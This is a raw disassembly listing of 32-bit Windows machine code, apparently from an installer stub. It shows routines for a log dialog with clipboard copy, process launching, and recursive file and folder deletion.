  40575d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405764:	57                   	push   %edi
  405765:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405768:	0f 85 89 01 00 00    	jne    0x4058f7
  40576e:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  405772:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  405776:	6a 02                	push   $0x2
  405778:	33 c0                	xor    %eax,%eax
  40577a:	5e                   	pop    %esi
  40577b:	8d 7d e0             	lea    -0x20(%ebp),%edi
  40577e:	89 75 c8             	mov    %esi,-0x38(%ebp)
  405781:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  405784:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  405787:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40578a:	ab                   	stos   %eax,%es:(%edi)
  40578b:	ab                   	stos   %eax,%es:(%edi)
  40578c:	a1 30 9a 42 00       	mov    0x429a30,%eax
  405791:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  405797:	68 03 04 00 00       	push   $0x403
  40579c:	8b 48 5c             	mov    0x5c(%eax),%ecx
  40579f:	8b 40 60             	mov    0x60(%eax),%eax
  4057a2:	ff 75 08             	push   0x8(%ebp)
  4057a5:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4057a8:	89 45 10             	mov    %eax,0x10(%ebp)
  4057ab:	ff d7                	call   *%edi
  4057ad:	68 ee 03 00 00       	push   $0x3ee
  4057b2:	a3 f0 89 42 00       	mov    %eax,0x4289f0
  4057b7:	ff 75 08             	push   0x8(%ebp)
  4057ba:	ff d7                	call   *%edi
  4057bc:	68 f8 03 00 00       	push   $0x3f8
  4057c1:	a3 e8 89 42 00       	mov    %eax,0x4289e8
  4057c6:	ff 75 08             	push   0x8(%ebp)
  4057c9:	ff d7                	call   *%edi
  4057cb:	ff 35 f0 89 42 00    	push   0x4289f0
  4057d1:	a3 04 8a 42 00       	mov    %eax,0x428a04
  4057d6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057d9:	e8 5f ed ff ff       	call   0x40453d
  4057de:	6a 04                	push   $0x4
  4057e0:	e8 b1 f6 ff ff       	call   0x404e96
  4057e5:	a3 f4 89 42 00       	mov    %eax,0x4289f4
  4057ea:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4057ed:	50                   	push   %eax
  4057ee:	89 1d 0c 8a 42 00    	mov    %ebx,0x428a0c
  4057f4:	ff 75 fc             	push   -0x4(%ebp)
  4057f7:	ff 15 64 82 40 00    	call   *0x408264
  4057fd:	56                   	push   %esi
  4057fe:	ff 15 88 82 40 00    	call   *0x408288
  405804:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405807:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40580d:	2b c8                	sub    %eax,%ecx
  40580f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405812:	50                   	push   %eax
  405813:	53                   	push   %ebx
  405814:	68 61 10 00 00       	push   $0x1061
  405819:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40581c:	ff 75 fc             	push   -0x4(%ebp)
  40581f:	ff d6                	call   *%esi
  405821:	b8 00 40 00 00       	mov    $0x4000,%eax
  405826:	50                   	push   %eax
  405827:	50                   	push   %eax
  405828:	68 36 10 00 00       	push   $0x1036
  40582d:	ff 75 fc             	push   -0x4(%ebp)
  405830:	ff d6                	call   *%esi
  405832:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405835:	7c 1c                	jl     0x405853
  405837:	ff 75 0c             	push   0xc(%ebp)
  40583a:	53                   	push   %ebx
  40583b:	68 01 10 00 00       	push   $0x1001
  405840:	ff 75 fc             	push   -0x4(%ebp)
  405843:	ff d6                	call   *%esi
  405845:	ff 75 0c             	push   0xc(%ebp)
  405848:	53                   	push   %ebx
  405849:	68 26 10 00 00       	push   $0x1026
  40584e:	ff 75 fc             	push   -0x4(%ebp)
  405851:	ff d6                	call   *%esi
  405853:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  405856:	7c 0e                	jl     0x405866
  405858:	ff 75 10             	push   0x10(%ebp)
  40585b:	53                   	push   %ebx
  40585c:	68 24 10 00 00       	push   $0x1024
  405861:	ff 75 fc             	push   -0x4(%ebp)
  405864:	ff d6                	call   *%esi
  405866:	8b 45 14             	mov    0x14(%ebp),%eax
  405869:	ff 70 30             	push   0x30(%eax)
  40586c:	6a 1b                	push   $0x1b
  40586e:	ff 75 08             	push   0x8(%ebp)
  405871:	e8 92 ec ff ff       	call   0x404508
  405876:	f6 05 38 9a 42 00 03 	testb  $0x3,0x429a38
  40587d:	74 34                	je     0x4058b3
  40587f:	53                   	push   %ebx
  405880:	ff 35 f0 89 42 00    	push   0x4289f0
  405886:	ff 15 28 82 40 00    	call   *0x408228
  40588c:	f6 05 38 9a 42 00 02 	testb  $0x2,0x429a38
  405893:	75 0d                	jne    0x4058a2
  405895:	6a 08                	push   $0x8
  405897:	ff 75 fc             	push   -0x4(%ebp)
  40589a:	ff 15 28 82 40 00    	call   *0x408228
  4058a0:	eb 06                	jmp    0x4058a8
  4058a2:	89 1d f0 89 42 00    	mov    %ebx,0x4289f0
  4058a8:	ff 35 e8 89 42 00    	push   0x4289e8
  4058ae:	e8 8a ec ff ff       	call   0x40453d
  4058b3:	68 ec 03 00 00       	push   $0x3ec
  4058b8:	ff 75 08             	push   0x8(%ebp)
  4058bb:	ff d7                	call   *%edi
  4058bd:	68 00 00 30 75       	push   $0x75300000
  4058c2:	8b f8                	mov    %eax,%edi
  4058c4:	53                   	push   %ebx
  4058c5:	68 01 04 00 00       	push   $0x401
  4058ca:	57                   	push   %edi
  4058cb:	ff d6                	call   *%esi
  4058cd:	f6 05 38 9a 42 00 04 	testb  $0x4,0x429a38
  4058d4:	0f 84 fc 01 00 00    	je     0x405ad6
  4058da:	ff 75 10             	push   0x10(%ebp)
  4058dd:	53                   	push   %ebx
  4058de:	68 09 04 00 00       	push   $0x409
  4058e3:	57                   	push   %edi
  4058e4:	ff d6                	call   *%esi
  4058e6:	ff 75 0c             	push   0xc(%ebp)
  4058e9:	53                   	push   %ebx
  4058ea:	68 01 20 00 00       	push   $0x2001
  4058ef:	57                   	push   %edi
  4058f0:	ff d6                	call   *%esi
  4058f2:	e9 df 01 00 00       	jmp    0x405ad6
  4058f7:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4058fe:	75 28                	jne    0x405928
  405900:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405903:	50                   	push   %eax
  405904:	53                   	push   %ebx
  405905:	68 ec 03 00 00       	push   $0x3ec
  40590a:	ff 75 08             	push   0x8(%ebp)
  40590d:	ff 15 3c 82 40 00    	call   *0x40823c
  405913:	50                   	push   %eax
  405914:	68 e1 56 40 00       	push   $0x4056e1
  405919:	53                   	push   %ebx
  40591a:	53                   	push   %ebx
  40591b:	ff 15 84 80 40 00    	call   *0x408084
  405921:	50                   	push   %eax
  405922:	ff 15 fc 80 40 00    	call   *0x4080fc
  405928:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40592f:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  405935:	75 1c                	jne    0x405953
  405937:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  40593d:	75 39                	jne    0x405978
  40593f:	53                   	push   %ebx
  405940:	ff 35 f0 89 42 00    	push   0x4289f0
  405946:	ff d7                	call   *%edi
  405948:	6a 08                	push   $0x8
  40594a:	56                   	push   %esi
  40594b:	ff d7                	call   *%edi
  40594d:	56                   	push   %esi
  40594e:	e8 ea eb ff ff       	call   0x40453d
  405953:	33 f6                	xor    %esi,%esi
  405955:	46                   	inc    %esi
  405956:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  40595d:	75 54                	jne    0x4059b3
  40595f:	39 1d ec 89 42 00    	cmp    %ebx,0x4289ec
  405965:	74 26                	je     0x40598d
  405967:	6a 78                	push   $0x78
  405969:	c7 05 d8 16 42 00 02 	movl   $0x2,0x4216d8
  405970:	00 00 00 
  405973:	e8 69 eb ff ff       	call   0x4044e1
  405978:	ff 75 14             	push   0x14(%ebp)
  40597b:	ff 75 10             	push   0x10(%ebp)
  40597e:	ff 75 0c             	push   0xc(%ebp)
  405981:	e8 e9 eb ff ff       	call   0x40456f
  405986:	5f                   	pop    %edi
  405987:	5e                   	pop    %esi
  405988:	5b                   	pop    %ebx
  405989:	c9                   	leave
  40598a:	c2 10 00             	ret    $0x10
  40598d:	6a 08                	push   $0x8
  40598f:	ff 35 28 9a 42 00    	push   0x429a28
  405995:	ff d7                	call   *%edi
  405997:	39 1d ac 9a 42 00    	cmp    %ebx,0x429aac
  40599d:	75 0e                	jne    0x4059ad
  40599f:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  4059a4:	53                   	push   %ebx
  4059a5:	ff 70 34             	push   0x34(%eax)
  4059a8:	e8 61 fc ff ff       	call   0x40560e
  4059ad:	56                   	push   %esi
  4059ae:	e8 2e eb ff ff       	call   0x4044e1
  4059b3:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4059b7:	75 bf                	jne    0x405978
  4059b9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059bc:	39 45 10             	cmp    %eax,0x10(%ebp)
  4059bf:	75 b7                	jne    0x405978
  4059c1:	53                   	push   %ebx
  4059c2:	53                   	push   %ebx
  4059c3:	68 04 10 00 00       	push   $0x1004
  4059c8:	50                   	push   %eax
  4059c9:	ff 15 58 82 40 00    	call   *0x408258
  4059cf:	3b c3                	cmp    %ebx,%eax
  4059d1:	89 45 0c             	mov    %eax,0xc(%ebp)
  4059d4:	0f 8e fc 00 00 00    	jle    0x405ad6
  4059da:	ff 15 98 81 40 00    	call   *0x408198
  4059e0:	6a e1                	push   $0xffffffe1
  4059e2:	53                   	push   %ebx
  4059e3:	8b f8                	mov    %eax,%edi
  4059e5:	e8 dc 0b 00 00       	call   0x4065c6
  4059ea:	50                   	push   %eax
  4059eb:	56                   	push   %esi
  4059ec:	53                   	push   %ebx
  4059ed:	57                   	push   %edi
  4059ee:	ff 15 9c 81 40 00    	call   *0x40819c
  4059f4:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4059f7:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  4059fb:	c1 e9 10             	shr    $0x10,%ecx
  4059fe:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405a02:	0f bf c9             	movswl %cx,%ecx
  405a05:	75 13                	jne    0x405a1a
  405a07:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405a0a:	50                   	push   %eax
  405a0b:	ff 75 fc             	push   -0x4(%ebp)
  405a0e:	ff 15 e8 81 40 00    	call   *0x4081e8
  405a14:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405a17:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405a1a:	53                   	push   %ebx
  405a1b:	ff 75 08             	push   0x8(%ebp)
  405a1e:	53                   	push   %ebx
  405a1f:	51                   	push   %ecx
  405a20:	50                   	push   %eax
  405a21:	68 80 01 00 00       	push   $0x180
  405a26:	57                   	push   %edi
  405a27:	ff 15 a0 81 40 00    	call   *0x4081a0
  405a2d:	3b c6                	cmp    %esi,%eax
  405a2f:	0f 85 a1 00 00 00    	jne    0x405ad6
  405a35:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a38:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405a3b:	c7 45 d4 08 2f 42 00 	movl   $0x422f08,-0x2c(%ebp)
  405a42:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405a49:	89 45 08             	mov    %eax,0x8(%ebp)
  405a4c:	bf 73 10 00 00       	mov    $0x1073,%edi
  405a51:	ff 4d 08             	decl   0x8(%ebp)
  405a54:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a57:	50                   	push   %eax
  405a58:	ff 75 08             	push   0x8(%ebp)
  405a5b:	57                   	push   %edi
  405a5c:	ff 75 fc             	push   -0x4(%ebp)
  405a5f:	ff 15 58 82 40 00    	call   *0x408258
  405a65:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405a68:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405a6c:	75 e3                	jne    0x405a51
  405a6e:	53                   	push   %ebx
  405a6f:	ff 15 a4 81 40 00    	call   *0x4081a4
  405a75:	ff 15 a8 81 40 00    	call   *0x4081a8
  405a7b:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405a7e:	50                   	push   %eax
  405a7f:	6a 42                	push   $0x42
  405a81:	ff 15 10 81 40 00    	call   *0x408110
  405a87:	50                   	push   %eax
  405a88:	89 45 08             	mov    %eax,0x8(%ebp)
  405a8b:	ff 15 88 80 40 00    	call   *0x408088
  405a91:	8b f0                	mov    %eax,%esi
  405a93:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a96:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405a99:	50                   	push   %eax
  405a9a:	53                   	push   %ebx
  405a9b:	57                   	push   %edi
  405a9c:	ff 75 fc             	push   -0x4(%ebp)
  405a9f:	ff 15 58 82 40 00    	call   *0x408258
  405aa5:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405aa8:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405aad:	46                   	inc    %esi
  405aae:	46                   	inc    %esi
  405aaf:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405ab4:	46                   	inc    %esi
  405ab5:	46                   	inc    %esi
  405ab6:	43                   	inc    %ebx
  405ab7:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405aba:	7c d7                	jl     0x405a93
  405abc:	ff 75 08             	push   0x8(%ebp)
  405abf:	ff 15 8c 80 40 00    	call   *0x40808c
  405ac5:	ff 75 08             	push   0x8(%ebp)
  405ac8:	6a 0d                	push   $0xd
  405aca:	ff 15 ac 81 40 00    	call   *0x4081ac
  405ad0:	ff 15 b0 81 40 00    	call   *0x4081b0
  405ad6:	33 c0                	xor    %eax,%eax
  405ad8:	e9 a9 fe ff ff       	jmp    0x405986
  405add:	55                   	push   %ebp
  405ade:	8b ec                	mov    %esp,%ebp
  405ae0:	83 ec 20             	sub    $0x20,%esp
  405ae3:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405ae8:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405aec:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405aef:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405af2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405af5:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405af9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405afd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b00:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405b03:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405b07:	50                   	push   %eax
  405b08:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405b0e:	ff 75 08             	push   0x8(%ebp)
  405b11:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405b18:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405b1f:	ff 15 80 80 40 00    	call   *0x408080
  405b25:	85 c0                	test   %eax,%eax
  405b27:	74 04                	je     0x405b2d
  405b29:	33 c0                	xor    %eax,%eax
  405b2b:	eb 06                	jmp    0x405b33
  405b2d:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b33:	c9                   	leave
  405b34:	c2 04 00             	ret    $0x4
  405b37:	6a 00                	push   $0x0
  405b39:	ff 74 24 08          	push   0x8(%esp)
  405b3d:	ff 15 80 80 40 00    	call   *0x408080
  405b43:	85 c0                	test   %eax,%eax
  405b45:	74 04                	je     0x405b4b
  405b47:	33 c0                	xor    %eax,%eax
  405b49:	eb 06                	jmp    0x405b51
  405b4b:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b51:	c2 04 00             	ret    $0x4
  405b54:	6a 06                	push   $0x6
  405b56:	e8 22 0e 00 00       	call   0x40697d
  405b5b:	85 c0                	test   %eax,%eax
  405b5d:	74 0a                	je     0x405b69
  405b5f:	ff d0                	call   *%eax
  405b61:	85 c0                	test   %eax,%eax
  405b63:	74 04                	je     0x405b69
  405b65:	33 c0                	xor    %eax,%eax
  405b67:	40                   	inc    %eax
  405b68:	c3                   	ret
  405b69:	33 c0                	xor    %eax,%eax
  405b6b:	c3                   	ret
  405b6c:	55                   	push   %ebp
  405b6d:	8b ec                	mov    %esp,%ebp
  405b6f:	83 ec 10             	sub    $0x10,%esp
  405b72:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b75:	c7 05 10 5f 42 00 44 	movl   $0x44,0x425f10
  405b7c:	00 00 00 
  405b7f:	50                   	push   %eax
  405b80:	33 c0                	xor    %eax,%eax
  405b82:	68 10 5f 42 00       	push   $0x425f10
  405b87:	50                   	push   %eax
  405b88:	50                   	push   %eax
  405b89:	68 00 00 00 04       	push   $0x4000000
  405b8e:	50                   	push   %eax
  405b8f:	50                   	push   %eax
  405b90:	50                   	push   %eax
  405b91:	ff 75 08             	push   0x8(%ebp)
  405b94:	50                   	push   %eax
  405b95:	ff 15 7c 80 40 00    	call   *0x40807c
  405b9b:	85 c0                	test   %eax,%eax
  405b9d:	74 0c                	je     0x405bab
  405b9f:	ff 75 f4             	push   -0xc(%ebp)
  405ba2:	ff 15 fc 80 40 00    	call   *0x4080fc
  405ba8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405bab:	c9                   	leave
  405bac:	c2 04 00             	ret    $0x4
  405baf:	8b 44 24 04          	mov    0x4(%esp),%eax
  405bb3:	50                   	push   %eax
  405bb4:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405bb8:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405bbe:	ff 15 84 81 40 00    	call   *0x408184
  405bc4:	c2 04 00             	ret    $0x4
  405bc7:	ff 25 94 81 40 00    	jmp    *0x408194
  405bcd:	68 00 04 00 00       	push   $0x400
  405bd2:	ff 74 24 0c          	push   0xc(%esp)
  405bd6:	ff 74 24 0c          	push   0xc(%esp)
  405bda:	ff 35 f8 89 42 00    	push   0x4289f8
  405be0:	ff 15 90 81 40 00    	call   *0x408190
  405be6:	c2 08 00             	ret    $0x8
  405be9:	8b 44 24 08          	mov    0x8(%esp),%eax
  405bed:	8b c8                	mov    %eax,%ecx
  405bef:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405bf5:	83 3d c0 9a 42 00 00 	cmpl   $0x0,0x429ac0
  405bfc:	74 05                	je     0x405c03
  405bfe:	c1 e8 15             	shr    $0x15,%eax
  405c01:	75 47                	jne    0x405c4a
  405c03:	83 3d c8 9a 42 00 00 	cmpl   $0x0,0x429ac8
  405c0a:	74 06                	je     0x405c12
  405c0c:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405c12:	a1 28 9a 42 00       	mov    0x429a28,%eax
  405c17:	68 b0 a3 40 00       	push   $0x40a3b0
  405c1c:	a3 b4 a3 40 00       	mov    %eax,0x40a3b4
  405c21:	a1 20 9a 42 00       	mov    0x429a20,%eax
  405c26:	a3 b8 a3 40 00       	mov    %eax,0x40a3b8
  405c2b:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c2f:	a3 bc a3 40 00       	mov    %eax,0x40a3bc
  405c34:	c7 05 c0 a3 40 00 20 	movl   $0x428a20,0x40a3c0
  405c3b:	8a 42 00 
  405c3e:	89 0d c4 a3 40 00    	mov    %ecx,0x40a3c4
  405c44:	ff 15 8c 81 40 00    	call   *0x40818c
  405c4a:	c2 08 00             	ret    $0x8
  405c4d:	56                   	push   %esi
  405c4e:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c52:	57                   	push   %edi
  405c53:	56                   	push   %esi
  405c54:	e8 fb 03 00 00       	call   0x406054
  405c59:	8b f8                	mov    %eax,%edi
  405c5b:	83 ff ff             	cmp    $0xffffffff,%edi
  405c5e:	74 2e                	je     0x405c8e
  405c60:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405c65:	56                   	push   %esi
  405c66:	74 08                	je     0x405c70
  405c68:	ff 15 78 80 40 00    	call   *0x408078
  405c6e:	eb 06                	jmp    0x405c76
  405c70:	ff 15 44 81 40 00    	call   *0x408144
  405c76:	85 c0                	test   %eax,%eax
  405c78:	74 05                	je     0x405c7f
  405c7a:	33 c0                	xor    %eax,%eax
  405c7c:	40                   	inc    %eax
  405c7d:	eb 11                	jmp    0x405c90
  405c7f:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405c84:	75 08                	jne    0x405c8e
  405c86:	57                   	push   %edi
  405c87:	56                   	push   %esi
  405c88:	ff 15 d8 80 40 00    	call   *0x4080d8
  405c8e:	33 c0                	xor    %eax,%eax
  405c90:	5f                   	pop    %edi
  405c91:	5e                   	pop    %esi
  405c92:	c2 08 00             	ret    $0x8
  405c95:	55                   	push   %ebp
  405c96:	8b ec                	mov    %esp,%ebp
  405c98:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405c9e:	53                   	push   %ebx
  405c9f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405ca2:	56                   	push   %esi
  405ca3:	57                   	push   %edi
  405ca4:	8b 7d 08             	mov    0x8(%ebp),%edi
  405ca7:	8b c3                	mov    %ebx,%eax
  405ca9:	83 e0 04             	and    $0x4,%eax
  405cac:	57                   	push   %edi
  405cad:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405cb0:	e8 ab 02 00 00       	call   0x405f60
  405cb5:	f6 c3 08             	test   $0x8,%bl
  405cb8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405cbb:	74 17                	je     0x405cd4
  405cbd:	57                   	push   %edi
  405cbe:	ff 15 44 81 40 00    	call   *0x408144
  405cc4:	f7 d8                	neg    %eax
  405cc6:	1b c0                	sbb    %eax,%eax
  405cc8:	40                   	inc    %eax
  405cc9:	01 05 a8 9a 42 00    	add    %eax,0x429aa8
  405ccf:	e9 7d 01 00 00       	jmp    0x405e51
  405cd4:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405cd7:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405cdb:	74 11                	je     0x405cee
  405cdd:	85 c0                	test   %eax,%eax
  405cdf:	0f 84 1a 01 00 00    	je     0x405dff
  405ce5:	f6 c3 02             	test   $0x2,%bl
  405ce8:	0f 84 11 01 00 00    	je     0x405dff
  405cee:	be 10 4f 42 00       	mov    $0x424f10,%esi
  405cf3:	57                   	push   %edi
  405cf4:	56                   	push   %esi
  405cf5:	e8 8f 08 00 00       	call   0x406589
  405cfa:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405cfe:	74 0d                	je     0x405d0d
  405d00:	68 6c a5 40 00       	push   $0x40a56c
  405d05:	56                   	push   %esi
  405d06:	e8 9a 08 00 00       	call   0x4065a5
  405d0b:	eb 06                	jmp    0x405d13
  405d0d:	57                   	push   %edi
  405d0e:	e8 91 01 00 00       	call   0x405ea4
  405d13:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405d17:	75 0a                	jne    0x405d23
  405d19:	66 83 3d 10 4f 42 00 	cmpw   $0x5c,0x424f10
  405d20:	5c 
  405d21:	75 0b                	jne    0x405d2e
  405d23:	68 14 a0 40 00       	push   $0x40a014
  405d28:	57                   	push   %edi
  405d29:	e8 77 08 00 00       	call   0x4065a5
  405d2e:	57                   	push   %edi
  405d2f:	e8 6b 08 00 00       	call   0x40659f
  405d34:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405d37:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405d3d:	50                   	push   %eax
  405d3e:	56                   	push   %esi
  405d3f:	ff 15 40 81 40 00    	call   *0x408140
  405d45:	8b f0                	mov    %eax,%esi
  405d47:	83 fe ff             	cmp    $0xffffffff,%esi
  405d4a:	0f 84 a4 00 00 00    	je     0x405df4
  405d50:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405d57:	2e 
  405d58:	75 1e                	jne    0x405d78
  405d5a:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405d61:	00 
  405d62:	74 73                	je     0x405dd7
  405d64:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405d6b:	2e 
  405d6c:	75 0a                	jne    0x405d78
  405d6e:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405d75:	00 
  405d76:	74 5f                	je     0x405dd7
  405d78:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405d7e:	50                   	push   %eax
  405d7f:	53                   	push   %ebx
  405d80:	e8 04 08 00 00       	call   0x406589
  405d85:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405d8c:	74 15                	je     0x405da3
  405d8e:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d91:	83 e0 03             	and    $0x3,%eax
  405d94:	3c 03                	cmp    $0x3,%al
  405d96:	75 3f                	jne    0x405dd7
  405d98:	ff 75 0c             	push   0xc(%ebp)
  405d9b:	57                   	push   %edi
  405d9c:	e8 f4 fe ff ff       	call   0x405c95
  405da1:	eb 34                	jmp    0x405dd7
  405da3:	ff 75 fc             	push   -0x4(%ebp)
  405da6:	57                   	push   %edi
  405da7:	e8 a1 fe ff ff       	call   0x405c4d
  405dac:	85 c0                	test   %eax,%eax
  405dae:	75 1f                	jne    0x405dcf
  405db0:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405db3:	74 12                	je     0x405dc7
  405db5:	57                   	push   %edi
  405db6:	6a f1                	push   $0xfffffff1
  405db8:	e8 51 f8 ff ff       	call   0x40560e
  405dbd:	6a 00                	push   $0x0
  405dbf:	57                   	push   %edi
  405dc0:	e8 84 05 00 00       	call   0x406349
  405dc5:	eb 10                	jmp    0x405dd7
  405dc7:	ff 05 a8 9a 42 00    	incl   0x429aa8
  405dcd:	eb 08                	jmp    0x405dd7
  405dcf:	57                   	push   %edi
  405dd0:	6a f2                	push   $0xfffffff2
  405dd2:	e8 37 f8 ff ff       	call   0x40560e
  405dd7:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405ddd:	50                   	push   %eax
  405dde:	56                   	push   %esi
  405ddf:	ff 15 3c 81 40 00    	call   *0x40813c
  405de5:	85 c0                	test   %eax,%eax
  405de7:	0f 85 63 ff ff ff    	jne    0x405d50
  405ded:	56                   	push   %esi
  405dee:	ff 15 38 81 40 00    	call   *0x408138
  405df4:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405df8:	74 05                	je     0x405dff
  405dfa:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405dff:	33 f6                	xor    %esi,%esi
  405e01:	39 75 08             	cmp    %esi,0x8(%ebp)
  405e04:	74 4b                	je     0x405e51
  405e06:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405e09:	75 08                	jne    0x405e13
  405e0b:	ff 05 a8 9a 42 00    	incl   0x429aa8
  405e11:	eb 3e                	jmp    0x405e51
  405e13:	57                   	push   %edi
  405e14:	e8 cd 0a 00 00       	call   0x4068e6
  405e19:	85 c0                	test   %eax,%eax
  405e1b:	74 34                	je     0x405e51
  405e1d:	57                   	push   %edi
  405e1e:	e8 35 00 00 00       	call   0x405e58
  405e23:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e26:	0c 01                	or     $0x1,%al
  405e28:	50                   	push   %eax
  405e29:	57                   	push   %edi
  405e2a:	e8 1e fe ff ff       	call   0x405c4d
  405e2f:	85 c0                	test   %eax,%eax
  405e31:	75 16                	jne    0x405e49
  405e33:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405e36:	74 d3                	je     0x405e0b
  405e38:	57                   	push   %edi
  405e39:	6a f1                	push   $0xfffffff1
  405e3b:	e8 ce f7 ff ff       	call   0x40560e
  405e40:	56                   	push   %esi
  405e41:	57                   	push   %edi
  405e42:	e8 02 05 00 00       	call   0x406349
  405e47:	eb 08                	jmp    0x405e51
  405e49:	57                   	push   %edi
  405e4a:	6a e5                	push   $0xffffffe5
  405e4c:	e8 bd f7 ff ff       	call   0x40560e
  405e51:	5f                   	pop    %edi
  405e52:	5e                   	pop    %esi
  405e53:	5b                   	pop    %ebx
  405e54:	c9                   	leave
  405e55:	c2 08 00             	ret    $0x8
  405e58:	56                   	push   %esi
  405e59:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e5d:	56                   	push   %esi
  405e5e:	e8 3c 07 00 00       	call   0x40659f
  405e63:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e66:	50                   	push   %eax
  405e67:	56                   	push   %esi
  405e68:	ff 15 fc 81 40 00    	call   *0x4081fc
  405e6e:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e72:	74 0b                	je     0x405e7f
  405e74:	68 14 a0 40 00       	push   $0x40a014
  405e79:	56                   	push   %esi
  405e7a:	e8 26 07 00 00       	call   0x4065a5
  405e7f:	8b c6                	mov    %esi,%eax
  405e81:	5e                   	pop    %esi
  405e82:	c2 04 00             	ret    $0x4
  405e85:	8b 44 24 04          	mov    0x4(%esp),%eax
  405e89:	eb 0e                	jmp    0x405e99
  405e8b:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405e90:	74 0f                	je     0x405ea1
  405e92:	50                   	push   %eax
  405e93:	ff 15 08 82 40 00    	call   *0x408208
  405e99:	66 8b 08             	mov    (%eax),%cx
  405e9c:	66 85 c9             	test   %cx,%cx
  405e9f:	75 ea                	jne    0x405e8b
